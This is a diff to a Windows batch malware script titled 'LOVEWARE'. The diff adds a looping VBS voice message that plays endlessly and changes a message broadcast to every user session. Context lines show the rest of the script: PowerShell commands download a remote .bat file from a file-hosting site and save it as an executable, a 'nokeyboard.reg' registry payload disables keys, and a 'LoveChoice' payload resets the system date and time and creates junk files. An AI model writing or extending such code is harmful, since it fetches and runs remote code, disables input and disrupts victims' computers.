@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v7.4
+:: LOVEWARE v7.5
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -304,7 +304,7 @@ echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
 :: Send message to other users
 
 :haha
-msg * "You are hacked!"
+msg * "I Love You!"
 goto run3
 goto haha
 
@@ -315,6 +315,12 @@ goto haha
 
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file', 'mouse.exe')"
 powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file -OutFile mouse.bat"
+
+:: Create new vbs file that speaks.
+
+echo do>>speak.vbs
+echo CreateObject(“SAPI.SpVoice”).Speak”I love YOU”>>speak.vbs
+echo loop>>speak.vbs
 
 :: Create the final payload "LoveChoice"
 
@@ -378,6 +384,7 @@ echo goto crazymouse>>LoveChoice.bat
 :: Create some chaos
 
 echo :chaos>>LoveChoice.bat
+echo start speak.vbs>>LoveChoice.bat
 echo date 14/02/2006>>LoveChoice.bat
 echo time 00:00:00>>LoveChoice.bat
 echo nul >> %random%>>LoveChoice.bat
